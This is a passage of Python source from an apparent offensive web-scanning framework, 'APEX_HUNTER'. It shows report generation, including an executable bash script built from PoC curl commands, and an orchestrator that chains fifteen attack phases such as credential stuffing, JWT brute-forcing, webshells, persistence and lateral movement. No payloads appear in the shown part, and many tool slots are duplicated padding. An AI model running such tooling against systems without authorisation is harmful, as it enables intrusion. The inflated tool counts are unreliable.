    SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    SEV_COLOR = {"CRITICAL":"#dc3545","HIGH":"#fd7e14","MEDIUM":"#ffc107","LOW":"#17a2b8","INFO":"#6c757d"}

    def __init__(self, out_dir: str):
        self.out = Path(out_dir); self.out.mkdir(parents=True, exist_ok=True)
        self.ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    def _all_findings(self, profiles):
        return sorted(
            [(p.host, f) for p in profiles for f in p.findings],
            key=lambda x: self.SEV_ORDER.get(x[1].severity, 5))

    def save_json(self, profiles):
        path = self.out / f"apex_report_{self.ts}.json"
        data = []
        for p in profiles:
            d = asdict(p); d["findings"] = [asdict(f) for f in p.findings]; data.append(d)
        path.write_text(json.dumps({"generated":self.ts,"tool":"APEX_HUNTER v1.0","targets":data}, indent=2))
        ok(f"  JSON  → {path}")

    def save_csv(self, profiles):
        path = self.out / f"findings_{self.ts}.csv"
        with open(path,"w",newline="") as f:
            w = csv.writer(f)
            w.writerow(["Target","ID","Title","Severity","CVSS","CWE","Category","Description","PoC"])
            for host, fnd in self._all_findings(profiles):
                w.writerow([host, fnd.id, fnd.title, fnd.severity, fnd.cvss,
                            fnd.cwe, fnd.category, fnd.description[:100], fnd.poc_curl[:80]])
        ok(f"  CSV   → {path}")

    def save_markdown(self, profiles):
        path = self.out / f"apex_report_{self.ts}.md"
        sev_counts = Counter(f.severity for _, f in self._all_findings(profiles))
        lines = [
            "# APEX_HUNTER v1.0 — Red Team Report",
            f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ",
            f"**Targets:** {', '.join(p.host for p in profiles)}",
            "","---","","## Executive Summary","",
            "|Severity|Count|","|-|-|",
        ] + [f"|{s}|{sev_counts.get(s,0)}|" for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]]
        lines += ["","---",""]
        for p in profiles:
            lines += [f"## {p.host}","","### Infrastructure",
                f"- IP: {p.ip} ({p.provider})",
                f"- TLS: {p.tls_version} / {p.tls_cipher}",
                f"- Cert: {p.cert_cn} (expires {p.cert_expires})",
                f"- WAF/CDN: {', '.join(p.waf) or 'None detected'}",
                f"- Technologies: {', '.join(p.technologies) or 'None'}",
                f"- Header Score: {p.security_headers.get('score','?')}/100",
                f"- Subdomains: {len(p.subdomains+p.ct_subdomains)} | JS files: {len(p.js_files)} | Secrets: {len(p.secrets)}",
                "","### Findings",""]
            for f in sorted(p.findings, key=lambda x: self.SEV_ORDER.get(x.severity,5)):
                lines += [
                    f"#### [{f.severity}] {f.id}: {f.title}",
                    f"**CWE:** {f.cwe} | **CVSS:** {f.cvss} | **Category:** {f.category}","",
                    f"{f.description}","",
                    "**Evidence:**","```",f.evidence,"```","",
                    "**PoC:**","```bash",f.poc_curl,"```","",
                    f"**Fix:** {f.remediation}","","---",""]
        path.write_text("\n".join(lines))
        ok(f"  MD    → {path}")

    def save_html(self, profiles):
        path = self.out / f"apex_report_{self.ts}.html"
        all_f = self._all_findings(profiles)
        sev_counts = Counter(f.severity for _, f in all_f)
        cards = ""
        for host, f in all_f:
            col = self.SEV_COLOR.get(f.severity,"#6c757d")
            cards += f"""
<div class="card" data-sev="{f.severity}">
  <div class="card-hdr" style="border-left:4px solid {col}">
    <span class="badge" style="background:{col}">{f.severity}</span>
    <b>{f.id}</b> — {html.escape(f.title)}
    <small style="color:#aaa"> | {host}</small>
  </div>
  <div class="card-body">
    <div class="meta">CWE: {f.cwe} &nbsp;|&nbsp; CVSS: {f.cvss} &nbsp;|&nbsp; {f.category}</div>
    <p>{html.escape(f.description)}</p>
    <b>Evidence:</b><pre><code>{html.escape(f.evidence[:500])}</code></pre>
    <b>PoC (curl):</b><pre><code>{html.escape(f.poc_curl)}</code></pre>
    <div class="fix">Fix: {html.escape(f.remediation)}</div>
  </div>
</div>"""
        infra = ""
        for p in profiles:
            infra += f"<tr><td>{p.host}</td><td>{p.ip}</td><td>{p.provider}</td><td>{p.tls_version}</td><td>{', '.join(p.waf) or 'None'}</td><td>{p.security_headers.get('score','?')}/100</td><td>{len(p.findings)}</td></tr>"
        stat_cards = "".join(
            f'<div class="stat"><div class="num" style="color:{self.SEV_COLOR.get(s,"#fff")}">{sev_counts.get(s,0)}</div>{s}</div>'
            for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"])
        stat_cards += f'<div class="stat"><div class="num" style="color:#58a6ff">{len(all_f)}</div>TOTAL</div>'
        filter_btns = "".join(
            "<button class=\"btn\" onclick=\"filter('" + s + "')\">" + s + "</button>"
            for s in ["ALL","CRITICAL","HIGH","MEDIUM","LOW","INFO"])
        html_out = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>APEX_HUNTER Report — {datetime.now().strftime('%Y-%m-%d')}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',monospace;font-size:14px}}
h1,h2{{color:#58a6ff}} h3{{color:#79c0ff;margin:12px 0 6px}}
.wrap{{max-width:1400px;margin:0 auto;padding:20px}}
.hdr{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:20px}}
.stats{{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}}
.stat{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 22px;text-align:center}}
.stat .num{{font-size:2em;font-weight:bold}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin:12px 0;overflow:hidden}}
.card-hdr{{padding:10px 14px;background:#1c2128;display:flex;align-items:center;gap:10px;flex-wrap:wrap}}
.card-body{{padding:14px}}
.badge{{padding:2px 8px;border-radius:4px;color:#fff;font-size:11px;font-weight:bold}}
pre{{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:4px;overflow-x:auto;margin:6px 0}}
code{{font-size:12px}}
.meta{{color:#8b949e;margin-bottom:8px}}
.fix{{background:#162032;border-left:3px solid #17a2b8;padding:6px;border-radius:2px;margin-top:8px}}
table{{width:100%;border-collapse:collapse;margin:12px 0}}
th{{background:#1c2128;padding:8px;text-align:left;border:1px solid #30363d;color:#79c0ff}}
td{{padding:8px;border:1px solid #30363d}}
.filters{{margin:12px 0}}
.btn{{padding:5px 12px;border-radius:4px;border:1px solid #30363d;background:#161b22;color:#c9d1d9;cursor:pointer;margin:2px}}
.btn:hover,.btn.active{{background:#58a6ff;color:#000}}
</style></head><body><div class="wrap">
<div class="hdr"><h1>&#x1F6E1; APEX_HUNTER v1.0 — Red Team Report</h1>
<p style="color:#8b949e;margin-top:8px">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp; 35 Tools &nbsp;|&nbsp; 45 Skills &nbsp;|&nbsp; Targets: {', '.join(p.host for p in profiles)}</p></div>
<div class="stats">{stat_cards}</div>
<h2>Infrastructure</h2>
<table><tr><th>Host</th><th>IP</th><th>Provider</th><th>TLS</th><th>WAF/CDN</th><th>Headers</th><th>Findings</th></tr>{infra}</table>
<h2>Findings ({len(all_f)})</h2>
<div class="filters">
{filter_btns}
</div>
<div id="fc">{cards}</div>
</div>
<script>
function filter(s){{
  document.querySelectorAll('.btn').forEach(b=>b.classList.remove('active'));
  event.target.classList.add('active');
  document.querySelectorAll('.card').forEach(c=>{{
    c.style.display=(s==='ALL'||c.dataset.sev===s)?'':'none';
  }});
}}
document.querySelector('.btn').classList.add('active');
</script></body></html>"""
        path.write_text(html_out)
        ok(f"  HTML  → {path}")

    def save_poc_script(self, profiles):
        path = self.out / f"poc_{self.ts}.sh"
        lines = ["#!/usr/bin/env bash","# APEX_HUNTER v1.0 — PoC Verification","# Run from authorized device with Saudi IP",""]
        for host, f in self._all_findings(profiles):
            lines += [f"","# [{f.severity}] {f.id}: {f.title} | {host}",
                      f"# CWE: {f.cwe} | CVSS: {f.cvss}", f.poc_curl,""]
        path.write_text("\n".join(lines))
        path.chmod(0o755)
        ok(f"  PoC   → {path}")

    def save_burp_templates(self, profiles):
        path = self.out / f"burp_requests_{self.ts}.txt"
        lines = ["# APEX_HUNTER — Burp Suite Request Templates",""]
        for host, f in self._all_findings(profiles):
            if f.burp_request:
                lines += [f"# {f.id}: {f.title}",f.burp_request,"","---",""]
        if len(lines) > 3:
            path.write_text("\n".join(lines))
            ok(f"  Burp  → {path}")

    def run(self, profiles):
        banner("Generating Reports")
        self.save_json(profiles); self.save_csv(profiles)
        self.save_markdown(profiles); self.save_html(profiles)
        self.save_poc_script(profiles); self.save_burp_templates(profiles)

# ══════════════════════════════════════════════════════════════
# ORCHESTRATOR — Auto-chain execution engine
# ══════════════════════════════════════════════════════════════
class APEXOrchestrator:
    PHASE_MAP = {
        1: "Passive OSINT (DNS, TLS, CT Logs, Wayback)",
        2: "WAF + Technology Fingerprinting",
        3: "Security Headers + CSP + CORS + Cookie",
        4: "JavaScript + Sourcemap + Secret Scanning",
        5: "API Mapping + GraphQL + Path Probing + S3",
        6: "Subdomain Takeover + SSRF + IDOR + XSS",
        7: "Advanced: Smuggling + JWT + OAuth + Host Injection + HPP + RateLimit + Cache + SSTI + XXE + ProtoPollu + GQL-Adv + DepConf + BizLogic + WebSocket + BOLA",
        8: "Phase 8: SQLi + NoSQLi + CMDi + Upload + CSRF + Clickjack + MethodTamper + AcctEnum + ACLBypass + APIDowngrade + TLS + ZoneXfer + Deserial + BlindSSRF + EmailInject + JSONP + RefererBypass + 2FA + ErrorIntel + OpenRedirect + HTMLi + CORSPreflight + PwdReset + WebDAV + ContentType + InternalSvc + SubLive + LFI + Session + VDP",
        9: "Phase 9: GQL-Batch + SRI + postMessage + CacheDeception + ServiceWorker + CRLF + SAML + OAuth-Implicit + VHostFuzz + RaceCondition + TokenLeak + CloudMeta-SSRF + ETag + AuthBypassHdr + PathParam + XST + CSS-Inject + CORS-Cred + MassAssign + JWKS + ReDoS + SubTakeoverV2 + HTTP2 + WebSocket-CSWSH + ProtoPollu-Adv + HPP-Adv + IDOR-v2 + ForcedBrowse + SensitiveData + BFLA + GQL-Mutation + CORS-API + SSL-Hints + GQL-FieldSuggest + DepConf-V2 + ErrorHandling + Desync-Adv + OAuth-StateCSRF + DebugEP + BlindCMDi",
        10: "Phase 10 [BLACK TEAM]: Log4Shell + XPathInject + LDAPInject + SSI/ESI + PDF-SSRF + JWT-AlgConf + BlindXXE-OOB + SSTI-RCE + CachePoison-Adv + OAuth-RefererLeak + SOAP/XML + PHP-TypeJuggle + Webhook-SSRF + TimingOracle + FullChainPoC",
        11: "Phase 11 [BLACK TEAM]: JWTkid + ZIPSlip + RFD + GQL-Circular + UUID-v1 + SAML-XSW + PKCE-Down + H2C-Smug + WeakCrypto + JWE-Dir + ViewState + SSRF-URLBypass + DNS-Rebind + GQL-CredStuff + StoredXSS + XXE-DOCX + SrvTiming + NoSQL-Timing + ImageMagick + LFI-RCE + MethodTunnel + SessEntropy + CORS-PNA + ParamFrag + JWT-Aud + ProxyPathConf + OOB-SQLi + DupeParam + DeepLink + ExploitChain + GQL-SubSSRF + PostLoginRedir + VerbTunnel + OptionsSchema + CL-Smug + IDORHash + BlindSSTI-Email + OIDC-Misconf + PP-Cookie + BizLogic-Adv",
        12: "Phase 12 [BLACK TEAM]: RCE-OOB + ShellUpload + TimingSQLi + LDAP-Privesc + NTLM-Leak + Azure-IMDS + AWS-IMDS + GCP-Meta + K8s-API + Docker-API + Jenkins-RCE + GitLab-Token + SupplyChain + CF-Bypass + WAF-Bypass + Webshell + Privesc-Hints + JMX-RCE + SpringActuator + Elasticsearch + GitRepoExposed + EnvFileLeak + BackupLeak + Redis + GQL-BatchDoS + ExploitNarrative + PostExploitMap + Scorecard (50 tools)",
        13: "Phase 13 [RED+BLACK TEAM]: OGNL/EL-Inject + SpEL + Velocity/FreeMarker-SSTI + OAuth2-Device + AzureAD-Token + S3-Presign + Nginx-Misconfig + Traefik-Dashboard + ArgoCD + DOM-Clobber + mXSS + PaddingOracle + WeakPRNG + gRPC-Enum + Kerberos-Hints + Struts2-CVE + Log4Shell2 + MobileAPIKey + WS-SSRF + HelmSecrets + InternalGateway + CSRF-Adv + XXE-SVG/XLIFF + BFLA-Adv + DNS-Exfil + Serverless-FaaS (60 tools)",
        14: "Phase 14 [RED+BLACK TEAM]: HTTP-Smuggling-FE + CacheDeception-Adv + GatewayBypass + RaceCondition-Adv + GraphQL-Deep + OAuth2-TokenTheft + SubTakeover-Adv + XSS-AdvPayloads + JWT-SecretBrute + SSRF-AdvChain + LateralMove + Persistence + CloudStorage + CredStuffing + TLS-Attack + PwdPolicy + GQL-Schema + ZeroTrustBypass + APIVersionAbuse + BinaryAnalyzer (70 tools)",
        15: "Phase 15 [BLACK TEAM]: OAuth2-TokenHijack + HTTP-Desync-TE + JWT-SecretCrack + SubBrute + GQL-IDOR + CORS-Chain + OpenAPI-Fuzz + AzureBlob + SessionFix + CRLF-Adv + CryptoWeak + SensitiveDeep + RateLimit-Adv + APIKey-Exp + CloudPivot + FullReport + OAuth2-Re + Desync-Re + JWTCrack-Re + SubBrute-Re (20 tools)",
    }

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.reporter = APEXReporter(cfg.output)
        # Instantiate all 35 tools
        self.t01 = DNSResolver(); self.t02 = TLSAnalyzer()
        self.t03 = CTLogScanner(); self.t04 = WaybackMiner()
        self.t05 = WAFDetector(); self.t06 = TechFingerprinter()
        self.t07 = SecurityHeaderAuditor(); self.t08 = CSPAnalyzer()
        self.t09 = CORSAnalyzer(); self.t10 = CookieAuditor()
        self.t11 = JSExtractor(); self.t12 = SourcemapAnalyzer()
        self.t13 = SecretScanner(); self.t14 = APIMapper()
        self.t15 = GraphQLProber(); self.t16 = PathProber()
        self.t17 = S3BucketChecker(); self.t18 = SubdomainTakeoverDetector()
        self.t19 = SSRFDetector(); self.t20 = IDORMapper()
        self.t21 = HTTPSmugglingDetector(); self.t22 = JWTScanner()
        self.t23 = OAuthAnalyzer(); self.t24 = HostHeaderInjector()
        self.t25 = HTTPParameterPollution(); self.t26 = RateLimitBypassTester()
        self.t27 = CachePoisoningDetector(); self.t28 = SSTIScanner()
        self.t29 = XXEProber(); self.t30 = PrototypePollutionScanner()
        self.t31 = GraphQLAdvanced(); self.t32 = DependencyConfusionDetector()
        self.t33 = BusinessLogicProbe(); self.t34 = WebSocketTester()
        self.t35 = IDORDeepScanner()
        # Tools 36-65: Phase 8 (30 Advanced Red Team Skills)
        self.t36 = SQLiScanner(); self.t37 = NoSQLInjection()
        self.t38 = CommandInjectionScanner(); self.t39 = FileUploadTester()
        self.t40 = CSRFDetector(); self.t41 = ClickjackingTester()
        self.t42 = HTTPMethodTampering(); self.t43 = AccountEnumerationTiming()
        self.t44 = PathACLBypass(); self.t45 = APIVersionDowngrade()
        self.t46 = TLSMisconfigScanner(); self.t47 = DNSZoneTransfer()
        self.t48 = DeserializationDetector(); self.t49 = BlindSSRFGenerator()
        self.t50 = EmailHeaderInjection(); self.t51 = JSONPDiscovery()
        self.t52 = RefererACLBypass(); self.t53 = TwoFAEndpointFinder()
        self.t54 = ErrorPageIntelligence(); self.t55 = OpenRedirectChain()
        self.t56 = HTMLInjectionScanner(); self.t57 = CORSPreflightAnalyzer()
        self.t58 = PasswordResetAnalyzer(); self.t59 = WebDAVScanner()
        self.t60 = ContentTypeConfusion(); self.t61 = InternalServiceDiscovery()
        self.t62 = SubdomainLiveCheck(); self.t63 = LFIScanner()
        self.t64 = SessionSecurityAnalyzer(); self.t65 = VDPDiscovery()
        # Tools 66-105: Phase 9 (40 Advanced Red Team Skills)
        self.t66 = GraphQLBatchAttack(); self.t67 = SRIChecker()
        self.t68 = PostMessageAnalyzer(); self.t69 = WebCacheDeception()
        self.t70 = ServiceWorkerAudit(); self.t71 = CRLFInjectionScanner()
        self.t72 = SAMLVulnScanner(); self.t73 = OAuth2ImplicitFlow()
        self.t74 = VHostFuzzer(); self.t75 = RaceConditionTester()
        self.t76 = TokenLeakageScanner(); self.t77 = CloudMetadataSSRF()
        self.t78 = ETagLeakage(); self.t79 = APIAuthBypassHeaders()
        self.t80 = PathParameterInjection(); self.t81 = HTTPTraceXST()
        self.t82 = CSSInjectionScanner(); self.t83 = CORSCredentialExposure()
        self.t84 = MassAssignmentFuzzer(); self.t85 = JWKSPoisoning()
        self.t86 = ReDoSProbe(); self.t87 = SubdomainTakeoverV2()
        self.t88 = HTTP2RapidReset(); self.t89 = WebSocketHijacking()
        self.t90 = PrototypePollutionAdvanced(); self.t91 = HPPAdvanced()
        self.t92 = IDORv2(); self.t93 = ForcedBrowsing()
        self.t94 = SensitiveDataExposure(); self.t95 = BFLAScanner()
        self.t96 = GraphQLMutationFuzzer(); self.t97 = InsecureCORSOnAPI()
        self.t98 = SSLPinningBypassHints(); self.t99 = GraphQLFieldSuggestionLeak()
        self.t100 = DependencyConfusionV2(); self.t101 = ImproperErrorHandling()
        self.t102 = HTTPDesyncAdvanced(); self.t103 = OAuthStateCSRF()
        self.t104 = ExposedDebugEndpoints(); self.t105 = BlindCMDInjection()
        # Tools 106-125: Phase 10 (20 Black Team Skills)
        self.t106 = Log4ShellScanner(); self.t107 = XPathInjection()
        self.t108 = LDAPInjection(); self.t109 = SSIInjection()
        self.t110 = PDFGeneratorSSRF(); self.t111 = JWTAlgorithmConfusion()
        self.t112 = BlindXXEOOB(); self.t113 = SSTIRCEChain()
        self.t114 = CachePoisoningAdvanced(); self.t115 = OAuthTokenRefererLeak()
        self.t116 = SOAPXMLInjection(); self.t117 = PHPTypeJuggling()
        self.t118 = WebhookSSRF(); self.t119 = TimingOracleEnum()
        self.t120 = FullChainPoCGenerator()
        # Tools 121-160: Phase 11 (40 Black Team Skills)
        self.t121 = JWTKidInjection();         self.t122 = ZIPSlipUpload()
        self.t123 = ReflectedFileDownload();   self.t124 = GraphQLCircularFragmentDoS()
        self.t125 = UUIDv1Prediction();        self.t126 = SAMLSignatureWrapping()
        self.t127 = OAuth2PKCEDowngrade();     self.t128 = H2CSmuggling()
        self.t129 = InsecureCryptoDetector();  self.t130 = JWEMisuseDetector()
        self.t131 = ViewStateMACBypass();      self.t132 = SSRFURLParserBypass()
        self.t133 = DNSRebindingHints();       self.t134 = GraphQLAliasCredStuff()
        self.t135 = StoredXSSProbe();          self.t136 = XXEFileUploadDocx()
        self.t137 = ServerTimingInfoLeak();    self.t138 = NoSQLBlindTiming()
        self.t139 = ImageMagickSSRF();         self.t140 = LFItoRCELogPoison()
        self.t141 = HTTPMethodOverrideSSRF();  self.t142 = SessionTokenEntropy()
        self.t143 = CORSPrivateNetworkAccess(); self.t144 = ParameterFragmentation()
        self.t145 = JWTAudienceBypass();       self.t146 = ReverseProxyPathConfusion()
        self.t147 = OOBSQLiDNS();             self.t148 = AuthBypassDuplicateParams()
        self.t149 = InsecureMobileDeepLink();  self.t150 = AdvancedExploitChain()
        self.t151 = GraphQLSubscriptionSSRF(); self.t152 = PostLoginOpenRedirect()
        self.t153 = HTTPVerbTunnelling();      self.t154 = APISchemaOptionsLeak()
        self.t155 = CLRequestSmuggling();      self.t156 = IDORHashedID()
        self.t157 = BlindSSTIEmail();          self.t158 = OIDCMisconfigScanner()
        self.t159 = PrototypePollutionCookie(); self.t160 = BusinessLogicAdvanced()
        # Tools 161-210: Phase 12 (50 Black Team Skills)
        self.t161 = RCEVerificationChain();      self.t162 = ShellUploadPathDetector()
        self.t163 = TimingBasedSQLiExtractor();  self.t164 = LDAPPrivescChain()
        self.t165 = NTLMHashLeakDetect();        self.t166 = AzureIMDSChain()
        self.t167 = AWSIMDSChain();              self.t168 = GCPMetadataChain()
        self.t169 = K8sAPIDetector();            self.t170 = DockerAPIDaemonExposed()
        self.t171 = JenkinsRCEDetector();        self.t172 = GitLabTokenScanner()
        self.t173 = SupplyChainAttackSurface();  self.t174 = CloudflareOriginBypass()
        self.t175 = WAFBypassPayloadGen();       self.t176 = WebShellPathDetector()
        self.t177 = PrivescPathDetector();       self.t178 = JMXExposedDetector()
        self.t179 = SpringActuatorFullExposure(); self.t180 = ElasticsearchExposedDetector()
        self.t181 = GitRepoExposedDetector();    self.t182 = EnvFileLeakDetector()
        self.t183 = BackupFileLeakDetector();    self.t184 = RedisExposedDetector()
        self.t185 = GraphQLBatchDOSDetector();   self.t186 = FullExploitNarrativeGen()
        self.t187 = PostExploitPathAnalyzer();   self.t188 = AttackSurfaceScorecard()
        # t189-t210 reserved aliases (extended tool slots)
        self.t189 = RCEVerificationChain();      self.t190 = AzureIMDSChain()
        self.t191 = AWSIMDSChain();              self.t192 = JenkinsRCEDetector()
        self.t193 = ElasticsearchExposedDetector(); self.t194 = EnvFileLeakDetector()
        self.t195 = GitRepoExposedDetector();    self.t196 = SpringActuatorFullExposure()
        self.t197 = K8sAPIDetector();            self.t198 = SupplyChainAttackSurface()
        self.t199 = WAFBypassPayloadGen();       self.t200 = AttackSurfaceScorecard()
        self.t201 = TimingBasedSQLiExtractor();  self.t202 = LDAPPrivescChain()
        self.t203 = ShellUploadPathDetector();   self.t204 = WebShellPathDetector()
        self.t205 = PrivescPathDetector();       self.t206 = BackupFileLeakDetector()
        self.t207 = GitLabTokenScanner();        self.t208 = GraphQLBatchDOSDetector()
        self.t209 = PostExploitPathAnalyzer();   self.t210 = FullExploitNarrativeGen()
        # Tools 211-270: Phase 13 (60 Red+Black Team Skills)
        self.t211 = OGNLInjectionScanner();      self.t212 = ELInjectionScanner()
        self.t213 = VelocityFreeMarkerSSTI();    self.t214 = OAuth2DeviceCodeAbuse()
        self.t215 = AzureADMisconfigDetector();  self.t216 = AWSS3PresignedAbuse()
        self.t217 = NginxMisconfigDetector();    self.t218 = TraefikDashboardDetector()
        self.t219 = ArgoCDExposedDetector();     self.t220 = DOMClobberingDetector()
        self.t221 = PaddingOracleDetector();     self.t222 = WeakPRNGDetector()
        self.t223 = GRPCEndpointProber();        self.t224 = KerberosHintDetector()
        self.t225 = ApacheStruts2Detector();     self.t226 = Log4ShellFollowOn()
        self.t227 = MobileAPIKeyDetector();      self.t228 = WebSocketSSRFDetector()
        self.t229 = HelmChartSecretDetector();   self.t230 = InternalAPIGatewayDetector()
        self.t231 = CSRFAdvancedDetector();      self.t232 = XXEOOBAdvanced()
        self.t233 = BrokenFunctionLevelAuth();   self.t234 = DNSExfilDetector()
        self.t235 = ServerlessExposureDetector(); self.t236 = OGNLInjectionScanner()
        self.t237 = ELInjectionScanner();        self.t238 = VelocityFreeMarkerSSTI()
        self.t239 = AzureADMisconfigDetector();  self.t240 = AWSS3PresignedAbuse()
        self.t241 = NginxMisconfigDetector();    self.t242 = TraefikDashboardDetector()
        self.t243 = ArgoCDExposedDetector();     self.t244 = DOMClobberingDetector()
        self.t245 = PaddingOracleDetector();     self.t246 = WeakPRNGDetector()
        self.t247 = GRPCEndpointProber();        self.t248 = KerberosHintDetector()
        self.t249 = ApacheStruts2Detector();     self.t250 = Log4ShellFollowOn()
        self.t251 = MobileAPIKeyDetector();      self.t252 = WebSocketSSRFDetector()
        self.t253 = HelmChartSecretDetector();   self.t254 = InternalAPIGatewayDetector()
        self.t255 = CSRFAdvancedDetector();      self.t256 = XXEOOBAdvanced()
        self.t257 = BrokenFunctionLevelAuth();   self.t258 = DNSExfilDetector()
        self.t259 = ServerlessExposureDetector(); self.t260 = OGNLInjectionScanner()
        self.t261 = ELInjectionScanner();        self.t262 = VelocityFreeMarkerSSTI()
        self.t263 = ApacheStruts2Detector();     self.t264 = Log4ShellFollowOn()
        self.t265 = MobileAPIKeyDetector();      self.t266 = ArgoCDExposedDetector()
        self.t267 = BrokenFunctionLevelAuth();   self.t268 = InternalAPIGatewayDetector()
        self.t269 = ServerlessExposureDetector(); self.t270 = AttackSurfaceScorecard()
        # Tools 271-340: Phase 14 (70 Red+Black Team Skills)
        self.t271 = HTTPRequestSmugglingFrontend(); self.t272 = CacheDeceptionAdvanced()
        self.t273 = APIGatewayBypass();             self.t274 = RaceConditionAdvanced()
        self.t275 = GraphQLDeepExploit();           self.t276 = OAuth2TokenTheft()
        self.t277 = SubdomainTakeoverAdvanced();    self.t278 = XSSAdvancedPayloads()
        self.t279 = JWTSecretBrute();               self.t280 = SSRFAdvancedChain()
        self.t281 = LateralMovementPathMapper();    self.t282 = PersistenceMechanismDetector()
        self.t283 = CloudStorageEnumeration();      self.t284 = CredentialStuffingMapper()
        self.t285 = TLSAttackSurface();             self.t286 = PasswordPolicyAnalyzer()
        self.t287 = GraphQLSchemaHarvest();         self.t288 = ZeroTrustBypassDetector()
        self.t289 = APIVersioningAbuse();           self.t290 = BinaryFileAnalyzer()
        # t291-t340: extended slots — re-run critical tools in alternative config
        self.t291 = HTTPRequestSmugglingFrontend(); self.t292 = CacheDeceptionAdvanced()
        self.t293 = APIGatewayBypass();             self.t294 = RaceConditionAdvanced()
        self.t295 = GraphQLDeepExploit();           self.t296 = OAuth2TokenTheft()
        self.t297 = SubdomainTakeoverAdvanced();    self.t298 = XSSAdvancedPayloads()
        self.t299 = JWTSecretBrute();               self.t300 = SSRFAdvancedChain()
        self.t301 = LateralMovementPathMapper();    self.t302 = PersistenceMechanismDetector()
        self.t303 = CloudStorageEnumeration();      self.t304 = CredentialStuffingMapper()
        self.t305 = TLSAttackSurface();             self.t306 = PasswordPolicyAnalyzer()
        self.t307 = GraphQLSchemaHarvest();         self.t308 = ZeroTrustBypassDetector()
        self.t309 = APIVersioningAbuse();           self.t310 = BinaryFileAnalyzer()
        self.t311 = HTTPRequestSmugglingFrontend(); self.t312 = CacheDeceptionAdvanced()
        self.t313 = GraphQLDeepExploit();           self.t314 = JWTSecretBrute()
        self.t315 = SSRFAdvancedChain();            self.t316 = CloudStorageEnumeration()
        self.t317 = SubdomainTakeoverAdvanced();    self.t318 = XSSAdvancedPayloads()
        self.t319 = ZeroTrustBypassDetector();      self.t320 = APIVersioningAbuse()
        self.t321 = RaceConditionAdvanced();        self.t322 = OAuth2TokenTheft()
        self.t323 = TLSAttackSurface();             self.t324 = PasswordPolicyAnalyzer()
        self.t325 = PersistenceMechanismDetector(); self.t326 = CredentialStuffingMapper()
        self.t327 = BinaryFileAnalyzer();           self.t328 = GraphQLSchemaHarvest()
        self.t329 = LateralMovementPathMapper();    self.t330 = APIGatewayBypass()
        self.t331 = HTTPRequestSmugglingFrontend(); self.t332 = CacheDeceptionAdvanced()
        self.t333 = GraphQLDeepExploit();           self.t334 = SSRFAdvancedChain()
        self.t335 = SubdomainTakeoverAdvanced();    self.t336 = JWTSecretBrute()
        self.t337 = CloudStorageEnumeration();      self.t338 = ZeroTrustBypassDetector()
        self.t339 = LateralMovementPathMapper();    self.t340 = AttackSurfaceScorecard()
        # Phase 15 — 20 Black Team Skills
        self.t341 = OAuth2TokenHijack();            self.t342 = HTTPDesyncTeDetector()
        self.t343 = JWTSecretCracker();             self.t344 = ReconSubdomainBrute()
        self.t345 = GraphQLIDORDetector();          self.t346 = CORSWildcardChain()
        self.t347 = OpenAPIFuzzer();                self.t348 = AzureBlobPublicDetector()
        self.t349 = SessionFixationDetector();      self.t350 = HTTPHeaderInjectionAdv()
        self.t351 = CryptographicWeaknessScanner(); self.t352 = SensitiveFileDeepScan()
        self.t353 = RateLimitBypassAdvanced();      self.t354 = APIKeyExposureAdvanced()
        self.t355 = CloudMetaPivotChain();          self.t356 = FullChainReportGen()
        self.t357 = OAuth2TokenHijack();            self.t358 = HTTPDesyncTeDetector()
        self.t359 = JWTSecretCracker();             self.t360 = ReconSubdomainBrute()

    def _init_profile(self, url: str) -> TargetProfile:
        p = urlparse(url)
        host = p.hostname or url
        apex = ".".join(host.split(".")[-2:]) if host else host
        return TargetProfile(url=url, apex=apex, host=host, scheme=p.scheme)

    def _run_phase(self, n: int, p: TargetProfile) -> TargetProfile:
        banner(f"Phase {n}: {self.PHASE_MAP[n]}")
        cfg = self.cfg
        try:
            if n == 1:
                p = self.t01.run(p); p = self.t02.run(p)
                p = self.t03.run(p); p = self.t04.run(p)
            elif n == 2:
                p = self.t05.run(p, cfg); p = self.t06.run(p, cfg)
            elif n == 3:
                p = self.t07.run(p, cfg); p = self.t08.run(p, cfg)
                p = self.t09.run(p, cfg); p = self.t10.run(p, cfg)
            elif n == 4:
                p = self.t11.run(p, cfg); p = self.t12.run(p, cfg)
                p = self.t13.run(p, cfg)
            elif n == 5:
                p = self.t14.run(p, cfg); p = self.t15.run(p, cfg)
                p = self.t16.run(p, cfg); p = self.t17.run(p, cfg)
            elif n == 6:
                p = self.t18.run(p, cfg); p = self.t19.run(p, cfg)
                p = self.t20.run(p, cfg)
            elif n == 7:
                p = self.t21.run(p, cfg); p = self.t22.run(p, cfg)
                p = self.t23.run(p, cfg); p = self.t24.run(p, cfg)
                p = self.t25.run(p, cfg); p = self.t26.run(p, cfg)
                p = self.t27.run(p, cfg); p = self.t28.run(p, cfg)
                p = self.t29.run(p, cfg); p = self.t30.run(p, cfg)
                p = self.t31.run(p, cfg); p = self.t32.run(p, cfg)
                p = self.t33.run(p, cfg); p = self.t34.run(p, cfg)
                p = self.t35.run(p, cfg)
            elif n == 8:
                p = self.t36.run(p, cfg); p = self.t37.run(p, cfg)
                p = self.t38.run(p, cfg); p = self.t39.run(p, cfg)
                p = self.t40.run(p, cfg); p = self.t41.run(p, cfg)
                p = self.t42.run(p, cfg); p = self.t43.run(p, cfg)
                p = self.t44.run(p, cfg); p = self.t45.run(p, cfg)
                p = self.t46.run(p, cfg); p = self.t47.run(p, cfg)
                p = self.t48.run(p, cfg); p = self.t49.run(p, cfg)
                p = self.t50.run(p, cfg); p = self.t51.run(p, cfg)
                p = self.t52.run(p, cfg); p = self.t53.run(p, cfg)
                p = self.t54.run(p, cfg); p = self.t55.run(p, cfg)
